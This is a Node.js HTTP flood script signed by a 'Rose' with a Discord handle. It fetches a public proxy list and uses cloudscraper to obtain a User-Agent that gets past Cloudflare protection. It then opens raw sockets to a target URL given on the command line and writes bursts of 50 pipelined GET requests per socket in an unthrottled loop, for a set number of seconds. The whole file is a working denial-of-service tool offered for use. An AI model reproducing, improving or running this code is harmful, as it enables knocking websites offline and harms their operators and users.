/**
HTTP Script ~~ Coded by Rose
Discord: xRose#1337
*/ 
const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);

process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err ) => {});

const fs = require('fs');
var colors = require('colors');
var path = require('path');
var filename = path.basename(__filename);

var cloudscraper = require('cloudscraper');
const url = require('url');
var request = require('request');

request.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000&country=all&anonymity=all&ssl=all', (err, res, set) => {
    var proxy = set.match(/(\d{1,3}\.){3}\d{1,3}\:\d{1,5}/g);

    console.log('HTTP Script - By Rose'.america.bold);
    if (process.argv.length <= 2) {
    console.log('Usage: node '.white.bold + filename.white.bold + ' <url> <time>'.white.bold);
    console.log('Usage: node '.white.bold + filename.white.bold + ' http://static.pw 60'.white.bold);
    process.exit(-1);
	}
console.log('Starting script: '.magenta.bold + filename.white.bold);
console.log(colors.blue.bold('Loading %s Proxies.'), proxy.length);

var site = process.argv[2];
var ua = "";
var host = url.parse(site).host;

cloudscraper.get(site, function(error, response) {
    if (error) {} else {
        var parsed = JSON.parse(JSON.stringify(response));
        ua = (parsed["request"]["headers"]["User-Agent"]);
    }
    if (ua) {
    console.log('\nSuccessfully recieved UserAgent'.magenta.bold)
    console.log(ua.white.bold + '\n');
	} else {
	console.log('Unable to obtain the UserAgent '.white.bold + site.magenta.bold + '\n');
	process.exit(-1);
	}
});
const sleep =
   (waitTimeInMs) => 
     new Promise(resolve => 
      setTimeout(resolve, waitTimeInMs));
sleep(3000).then(() => {
console.log('Sending Requests...'.blue.bold);
});

var counter = 0;
var site = site.replace('https', 'http');
var int = setInterval(() => {
    if (ua !== '') {
        var rose = require('net').Socket();
        rose.connect(80, host);
        rose.setTimeout(10000);
        for (var i = 0; i < 50; i++) {
            rose.write('GET ' + site + '/ HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
        }
        rose.on('data', function() {
            setTimeout(function() {
                rose.destroy();
                return delete s;
            }, 5000);
        })
    }
});
setTimeout(function() {
    process.exit(1);
}, process.argv[3] * 1000);
});